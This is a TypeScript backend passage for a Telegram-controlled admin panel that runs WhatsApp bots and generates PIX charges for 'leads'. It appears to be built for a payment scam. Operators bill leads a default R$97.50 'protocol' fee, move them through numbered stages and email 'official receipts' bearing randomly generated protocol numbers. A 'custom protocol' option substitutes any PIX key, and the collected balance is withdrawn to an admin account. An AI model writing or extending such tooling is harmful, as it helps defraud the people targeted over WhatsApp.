          const labels: any = { key: "Chave PIX", type: "Tipo (CPF, EMAIL, PHONE, RANDOM)", name: "Nome do Beneficiário", doc: "CPF/CNPJ" };
          botStates.set(userId, { action: `awaiting_saque_edit_${field}` });
          await sendTelegram(`📝 <b>EDITAR ${labels[field].toUpperCase()}</b>\n\nDigite o novo valor:`, msgId, { inline_keyboard: [[{ text: "❌ Cancelar", callback_data: "painel:config_saque" }]] });
        }
        else if (text === "painel:saque_total") {
          const balance = await getGatewayBalance();
          if (!balance || balance.available < 1000) { // Minimo R$ 10
            await sendTelegram(`⚠️ <b>SALDO INSUFICIENTE</b>\n\nO saldo disponível deve ser de no mínimo R$ 10,00 para saque.`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:financeiro_menu" }]] });
            return;
          }
          if (!currentConfig.adminPixKey) {
            await sendTelegram(`⚠️ <b>CONTA NÃO CONFIGURADA</b>\n\nConfigure sua chave PIX antes de solicitar o saque.`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:config_saque" }]] });
            return;
          }

          const totalAvailable = balance.available / 100;
          const fee = (totalAvailable * (currentConfig.withdrawalFeePercent / 100)) + currentConfig.withdrawalFeeFixed;
          const netAmount = Math.max(0, totalAvailable - fee);

          const txt = `⚠️ <b>CONFIRMAÇÃO DE SAQUE</b>\n\n` +
            `💰 <b>Valor Bruto:</b> R$ ${totalAvailable.toFixed(2)}\n` +
            `💸 <b>Taxas Totais:</b> R$ ${fee.toFixed(2)}\n` +
            `✅ <b>Líquido na Conta:</b> <b>R$ ${netAmount.toFixed(2)}</b>\n\n` +
            `🔑 <b>Para:</b> ${currentConfig.adminPixKey}\n` +
            `👤 <b>Beneficiário:</b> ${currentConfig.adminPixName}\n\n` +
            `<i>O processamento pode levar alguns minutos. Confirma?</i>`;
          const kb = {
            inline_keyboard: [
              [{ text: "✅ Confirmar Saque", callback_data: "cmd:exec_saque" }],
              [{ text: "❌ Cancelar", callback_data: "painel:financeiro_menu" }]
            ]
          };
          await sendTelegram(txt, msgId, kb);
        }
        else if (text === "cmd:exec_saque") {
          const balance = await getGatewayBalance();
          if (!balance) return;
          try {
            await requestGatewayWithdrawal(balance.available);
            await sendTelegram(`🚀 <b>SAQUE SOLICITADO!</b>\n\nO pedido de saque de R$ ${(balance.available / 100).toFixed(2)} foi enviado para a gateway.\n\nAcompanhe o status no painel da FastSoft.`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:back" }]] });
          } catch (e: any) {
            await sendTelegram(`❌ <b>ERRO NO SAQUE</b>\n\n${e.message}`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:financeiro_menu" }]] });
          }
        }
        else if (text.startsWith("painel:edit_fin:")) {
          botStates.set(userId, { action: 'awaiting_fin_pass_edit' });
          await sendTelegram(`🔑 <b>ALTERAR SENHA FINANCEIRA</b>\n\nDigite a nova senha de segurança:`, msgId, { inline_keyboard: [[{ text: "❌ Cancelar", callback_data: "painel:financeiro_menu" }]] });
        }
        else if (text.startsWith("painel:edit_pix:")) {
          const field = text.split(":")[2];
          const labels: any = { name: "Nome Completo", email: "E-mail", doc: "Documento (CPF/CNPJ)", fee: "Taxa Gateway (%)" };
          botStates.set(userId, { action: `awaiting_pix_edit_${field}` });
          await sendTelegram(`📝 <b>EDITAR ${labels[field].toUpperCase()}</b>\n\nPor favor, digite o novo valor para este campo:`, msgId, { inline_keyboard: [[{ text: "❌ Cancelar", callback_data: "painel:config_pix" }]] });
        }
        else if (text.startsWith("cmd:pix_std:")) {
          const chatId = text.split(":")[2];
          botStates.set(userId, { action: 'awaiting_lead_pix_value', data: { chatId } });
          await sendTelegram(`💰 <b>VALOR DO PROTOCOLO</b>\n\nPor favor, <b>digite o valor</b> que deseja cobrar para o lead <code>${chatId}</code> (ex: 97.50):`, msgId, { inline_keyboard: [[{ text: "❌ Cancelar", callback_data: "painel:start" }]] });
        }
        else if (text.startsWith("cmd:pix_confirm_std:")) {
          const parts = text.split(":");
          const chatId = parts[2];
          const valor = parseFloat(parts[3]) || 97.50;
          await generateStandardPix(chatId, valor, msgId);
        }
        else if (text.startsWith("cmd:pix_custom:")) {
          const chatId = text.split(":")[3];
          botStates.set(userId, { action: 'awaiting_pix_key', data: { chatId } });
          await sendTelegram(`🛠️ <b>PROTOCOLO CUSTOMIZADO</b>\n\nPor favor, <b>digite a Chave PIX</b> (ou copie e cole o código) que será usada para este lead:\n\n<i>Aguardando sua mensagem...</i>`, msgId, { inline_keyboard: [[{ text: "❌ Cancelar", callback_data: "painel:back" }]] });
        }
        else if (text.startsWith("cmd:send_email:")) {
          const chatId = text.split(":")[2];
          // Tenta encontrar o lead na fila ou sessões do bot
          let leadName = "Titular";
          let leadEmail = "";

          // Procura nos arquivos de sessões do bot
          const sessionsPath = path.join(process.cwd(), 'sessions.json');
          if (fs.existsSync(sessionsPath)) {
            const botSessions = JSON.parse(fs.readFileSync(sessionsPath, 'utf-8'));
            if (botSessions[chatId]) {
              leadName = botSessions[chatId].name || leadName;
              leadEmail = botSessions[chatId].email || "";
            }
          }

          if (leadEmail && validateEmail(leadEmail)) {
            const manualProtocol = `SVR-${Math.random().toString(36).substring(2, 9).toUpperCase()}`;
            const success = await sendSuccessEmail(leadEmail, leadName, manualProtocol);
            if (success) {
              await sendTelegram(`🚀 <b>E-MAIL ENVIADO!</b>\n\nComprovante oficial enviado para: <code>${leadEmail}</code>`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:back" }]] });
            } else {
              await sendTelegram(`❌ <b>ERRO AO ENVIAR</b>\n\nVerifique as configurações SMTP no painel.`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:back" }]] });
            }
          } else {
            await sendTelegram(`⚠️ <b>DADO AUSENTE</b>\n\nO e-mail do lead não foi capturado ou é inválido.\n\nLead: <code>${chatId}</code>`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:back" }]] });
          }
        }
        else if (text.startsWith("etapa:")) {
          const parts = text.split(":");
          const num = parseInt(parts[1]);
          const chatId = parts[2];
          fs.writeFileSync(`cmd-etapa-${Date.now()}.json`, JSON.stringify({ etapa: num, chatId }));
          await sendTelegram(`✅ <b>SOLICITAÇÃO ENVIADA</b>\n\nComando para liberar <b>Etapa ${num}</b> enviado para o lead <code>${chatId}</code>.`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:back" }]] });
        }
        else if (text.startsWith("cmd:refresh_qr")) {
          const id = text.split(":")[2] || 'main';
          resetBotSession(id);
          await sendTelegram(`🔄 <b>SOLICITAÇÃO RECEBIDA</b>\n\nGerando novo QR Code para o slot <b>${id}</b>... Aguarde alguns segundos.`, msgId);
        }
        else if (text.startsWith("painel:change_whatsapp_num")) {
          const id = text.split(":")[2] || 'main';
          botStates.set(userId, { action: 'awaiting_whatsapp_new_number', data: { slotId: id } });
          await sendTelegram(`📱 <b>ALTERAR NÚMERO WHATSAPP (${id})</b>\n\nPor favor, digite o novo número de WhatsApp do bot (com DDI e DDD, ex: 5511999999999):\n\n<i>O bot será reiniciado com este número, gerando um novo QR Code.</i>`, msgId, { inline_keyboard: [[{ text: "❌ Cancelar", callback_data: "painel:back" }]] });
        }
        else if (text.startsWith("pix_dest:")) {
          const parts = text.split(":");
          const dest = parts[1];
          const pendingId = parts[2];
          const pix = pendingPix.get(pendingId);

          if (!pix) {
            await sendTelegram("❌ <b>ERRO:</b> Protocolo expirado ou não encontrado.", msgId);
            continue;
          }

          if (dest === 'lead') {
            // formalMessage já contém o código PIX embutido — envia apenas 1 mensagem
            fs.writeFileSync(`cmd-send-${Date.now()}.json`, JSON.stringify({ to: pix.telefone, message: pix.formalMessage }));
            await sendTelegram(`🚀 <b>ENVIADO AO LEAD!</b>\n\nO protocolo foi enviado com sucesso para <code>${pix.telefone}</code>.`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:back" }]] });
          } else if (dest === 'copy') {
            await sendTelegram(`📋 <b>HASH PIX (COPIAR):</b>\n\n<code>${pix.pixCode}</code>`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:back" }]] });
          } else if (dest === 'phone') {
            botStates.set(userId, { action: 'awaiting_target_phone', data: { pendingId } });
            await sendTelegram(`📱 <b>ENVIAR PARA OUTRO NÚMERO</b>\n\nPor favor, digite o número de telefone (com DDD) para o qual deseja enviar este PIX:`, msgId, { inline_keyboard: [[{ text: "❌ Cancelar", callback_data: "painel:back" }]] });
          }
        }
        else if (!cb && msg?.text) {
          const state = botStates.get(userId);

          if (state?.action?.startsWith('awaiting_pix_edit_')) {
            const field = state.action.replace('awaiting_pix_edit_', '');
            const value = msg.text.trim();

            let isValid = true;
            let errorMsg = "";

            if (field === 'email' && !validateEmail(value)) { isValid = false; errorMsg = "E-mail inválido."; }
            else if (field === 'doc' && !validateDocument(value)) { isValid = false; errorMsg = "Documento (CPF/CNPJ) inválido."; }
            else if (field === 'name' && value.length < 5) { isValid = false; errorMsg = "Nome muito curto."; }
            else if (field === 'fee' && isNaN(parseFloat(value))) { isValid = false; errorMsg = "Taxa deve ser um número."; }

            if (!isValid) {
              await sendTelegram(`❌ <b>ERRO DE VALIDAÇÃO</b>\n\n${errorMsg}\n\nTente novamente:`, msgId, { inline_keyboard: [[{ text: "❌ Cancelar", callback_data: "painel:config_pix" }]] });
              return;
            }

            const configKey: any = { name: 'pixName', email: 'pixEmail', doc: 'pixDocument', fee: 'gatewayFee' };
            const finalValue = field === 'fee' ? parseFloat(value) : value;
            (currentConfig as any)[configKey[field]] = finalValue;
            saveConfig();
            botStates.delete(userId);
            await sendTelegram(`✅ <b>ATUALIZADO COM SUCESSO!</b>\n\nO campo <b>${field}</b> foi definido como: <code>${value}</code>`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:config_pix" }]] });
          }
          else if (state?.action?.startsWith('awaiting_saque_edit_')) {
            const field = state.action.replace('awaiting_saque_edit_', '');
            const value = msg.text.trim();
            const configKey: any = { key: 'adminPixKey', type: 'adminPixType', name: 'adminPixName', doc: 'adminPixDoc' };
            (currentConfig as any)[configKey[field]] = value;
            saveConfig();
            botStates.delete(userId);
            await sendTelegram(`✅ <b>CONTA ATUALIZADA!</b>\n\nO campo <b>${field}</b> foi salvo.`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:config_saque" }]] });
          }
          else if (state?.action === 'awaiting_financial_password' || state?.action === 'awaiting_whatsapp_password') {
            if (msg.text === currentConfig.financialPassword) {
              const action = state.action;
              botStates.delete(userId);
              const target = action === 'awaiting_financial_password' ? 'painel:financeiro_menu' : 'painel:slots';
              await sendTelegram(`✅ <b>Acesso Liberado!</b>\n\nClique no botão abaixo para prosseguir:`, msgId, { inline_keyboard: [[{ text: "➡️ Acessar Painel", callback_data: target }]] });
            } else {
              await sendTelegram(`❌ <b>SENHA INCORRETA</b>\n\nTente novamente ou cancele:`, msgId, { inline_keyboard: [[{ text: "❌ Cancelar", callback_data: "painel:back" }]] });
            }
          }
          else if (state?.action === 'awaiting_fin_pass_edit') {
            currentConfig.financialPassword = msg.text.trim();
            saveConfig();
            botStates.delete(userId);
            await sendTelegram(`✅ <b>SENHA FINANCEIRA ALTERADA!</b>`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:financeiro_menu" }]] });
          }
          else if (state?.action?.startsWith('awaiting_saque_fee_edit_')) {
            const field = state.action.replace('awaiting_saque_fee_edit_', '');
            const value = parseFloat(msg.text.trim());
            if (isNaN(value)) {
              await sendTelegram(`❌ <b>VALOR INVÁLIDO</b>\n\nDigite um número válido.`, msgId, { inline_keyboard: [[{ text: "❌ Cancelar", callback_data: "painel:config_taxas_saque" }]] });
              return;
            }
            const configKey: any = { fixed: 'withdrawalFeeFixed', percent: 'withdrawalFeePercent' };
            (currentConfig as any)[configKey[field]] = value;
            saveConfig();
            botStates.delete(userId);
            await sendTelegram(`✅ <b>TAXA ATUALIZADA!</b>\n\nO campo foi definido como: ${value}`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:config_taxas_saque" }]] });
          }
          else if (state?.action?.startsWith('awaiting_smtp_edit_')) {
            const field = state.action.replace('awaiting_smtp_edit_', '');
            const value = msg.text.trim();

            const configKey: any = { name: 'smtpSenderName', host: 'smtpHost', port: 'smtpPort', user: 'smtpUser', pass: 'smtpPass' };
            const finalValue = field === 'port' ? parseInt(value) : value;
            (currentConfig as any)[configKey[field]] = finalValue;
            saveConfig();
            botStates.delete(userId);
            await sendTelegram(`✅ <b>SMTP ATUALIZADO!</b>\n\nO campo <b>${field}</b> foi definido com sucesso.`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:config_smtp" }]] });
          }
          else if (state?.action === 'awaiting_whatsapp_new_number') {
            const newNumber = msg.text.replace(/\D/g, '');
            if (newNumber.length < 10) {
              await sendTelegram(`❌ <b>NÚMERO INVÁLIDO</b>\n\nDigite um número válido.`, msgId);
              return;
            }
            currentConfig.whatsappNumber = newNumber;
            saveConfig();
            const slotId = state.data?.slotId || 'main';
            botStates.delete(userId);

            await sendTelegram(`✅ <b>NÚMERO ATUALIZADO!</b>\n\nO novo número (${newNumber}) foi salvo e o slot <b>${slotId}</b> será reiniciado para gerar um novo QR Code.`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar ao Painel", callback_data: "painel:back" }]] });

            // Reinicia o bot específico
            resetBotSession(slotId);
          }
          else if (state?.action === 'pix_auto_await_value' || state?.action === 'awaiting_lead_pix_value') {
            let cleanVal = msg.text.trim();
            const parts = cleanVal.split(',');
            if (parts.length > 1) {
              cleanVal = parts.slice(0, -1).join('').replace(/\./g, '') + '.' + parts[parts.length - 1];
            }
            const amount = parseFloat(cleanVal);
            if (isNaN(amount) || amount <= 0) {
              await sendTelegram(`❌ <b>VALOR INVÁLIDO</b>\n\nDigite um número válido para o valor (ex: 97.50).`, undefined);
              return;
            }
            const chatId = state.data.chatId;
            botStates.delete(userId);
            await sendTelegram(`⏳ <b>Gerando protocolo de R$ ${amount.toFixed(2)}...</b>\nAguarde um momento.`, undefined);
            await generateStandardPix(chatId, amount, undefined);
          }
          else if (state?.action?.startsWith('pix_preauto_edit_')) {
            const field = state.action.replace('pix_preauto_edit_', '');
            let value = msg.text.trim();
            if (field === 'amount') value = value.replace(',', '.');
            state.data[field] = value;
            state.action = 'pix_preauto_menu';
            botStates.set(userId, state);
            await showPixPreAutoMenu(userId);
          }
          else if (state?.action?.startsWith('pix_manual_edit_')) {
            const field = state.action.replace('pix_manual_edit_', '');
            const value = msg.text.trim();
            state.data[field] = value;
            state.action = 'pix_manual_menu';
            botStates.set(userId, state);
            await showPixManualMenu(userId);
          }
          else if (state?.action === 'awaiting_pix_key') {
            const key = msg.text.trim();
            const chatId = state.data.chatId;
            botStates.delete(userId);
            await generateModifiedPix(chatId, 97.50, key);
          }
          else if (state?.action === 'awaiting_target_phone') {
            const phone = msg.text.replace(/\D/g, '');
            const pendingId = state.data.pendingId;
            const pix = pendingPix.get(pendingId);
            botStates.delete(userId);
            if (pix) {
              const target = phone.includes('@c.us') ? phone : `${phone}@c.us`;
              fs.writeFileSync(`cmd-send-${Date.now()}.json`, JSON.stringify({ to: target, message: pix.formalMessage }));
              setTimeout(() => {
                fs.writeFileSync(`cmd-send-${Date.now() + 1}.json`, JSON.stringify({ to: target, message: pix.pixCode }));
              }, 1000);
              await sendTelegram(`🚀 <b>ENVIADO COM SUCESSO!</b>\n\nProtocolo enviado para o número <code>${phone}</code>.`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:back" }]] });
            }
          }
          else if (state?.action === 'awaiting_lead_pix_value') {
            const value = msg.text.trim().replace(',', '.');
            const valor = parseFloat(value);
            if (isNaN(valor) || valor <= 0) {
              await sendTelegram(`❌ <b>VALOR INVÁLIDO</b>\n\nDigite um número válido para o valor.`, msgId);
              return;
            }
            const chatId = state.data.chatId;
            botStates.delete(userId);

            const taxa = (valor * currentConfig.gatewayFee) / 100;
            const liquido = valor - taxa;

            const previewText = `💰 <b>PREVIEW DO PROTOCOLO PIX</b>\n\n` +
              `📱 <b>Lead:</b> <code>${chatId}</code>\n\n` +
              `💵 <b>Valor Bruto:</b> R$ ${valor.toFixed(2)}\n` +
              `💸 <b>Taxa Gateway (${currentConfig.gatewayFee}%):</b> R$ ${taxa.toFixed(2)}\n` +
              `💰 <b>Líquido Admin:</b> <b>R$ ${liquido.toFixed(2)}</b>\n\n` +
              `📋 <b>Dados do Pagador:</b>\n` +
              `• Nome: ${currentConfig.pixName}\n` +
              `• E-mail: ${currentConfig.pixEmail}\n` +
              `• Doc: ${currentConfig.pixDocument}\n\n` +
              `⚠️ <i>Confirma a geração deste protocolo?</i>`;
            const kb = {
              inline_keyboard: [
                [{ text: "💰 Gerar Protocolo PIX", callback_data: `cmd:pix_confirm_std:${chatId}:${valor}` }, { text: "📧 Enviar E-mail Manual", callback_data: `cmd:send_email:${chatId}` }],
                [{ text: "✅ Etapa 5 (Finalizar)", callback_data: `etapa:5:${chatId}` }],
                [{ text: "🏠 Voltar ao Início", callback_data: "painel:start" }]
              ]
            };
            await sendTelegram(previewText, msgId, kb);
          }
        }

      }
    } catch (e: any) {
      console.error("❌ [TELEGRAM POLLING ERROR]:", e.message);
      await new Promise(r => setTimeout(r, 5000));
    }
  }
}

function getBotStatusInfo(id: string) {
  try {
    const statusPath = path.join(process.cwd(), `bot-status-${id}.json`);
    if (fs.existsSync(statusPath)) {
      const data = JSON.parse(fs.readFileSync(statusPath, 'utf-8'));
      if (data.status === 'CONNECTED') return { emoji: "🟢", label: "Online" };
      if (data.status === 'WAITING_QR') return { emoji: "🟡", label: "Aguardando QR" };
    }
  } catch (e) { }
  return { emoji: "⚪", label: "Offline" };
}

function getQueueInfo() {
  try {
    if (fs.existsSync('waiting-queue.json')) return JSON.parse(fs.readFileSync('waiting-queue.json', 'utf-8'));
  } catch (e) { }
  return [];
}

startBot('main');
startTelegramPolling();
app.listen(port, "0.0.0.0", () => console.log(`🚀 Backend rodando na porta ${port}`));
